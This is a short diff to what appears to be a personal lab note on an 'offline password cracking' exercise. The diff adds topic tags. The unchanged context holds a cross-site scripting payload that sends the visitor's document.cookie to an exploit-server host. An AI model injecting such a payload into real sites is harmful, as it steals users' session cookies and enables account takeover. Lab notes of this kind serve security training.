@@ -4,6 +4,7 @@ title: "10 - Offline password cracking"
 
 # 10 - Offline password cracking
 
+#authentication #cracking #password #xss
 ```html
 <script>img = new Image(); img.src = "https://exploit-0acd007c035179828002b104017100b8.exploit-server.net/exploit?"+document.cookie;</script>
 ```
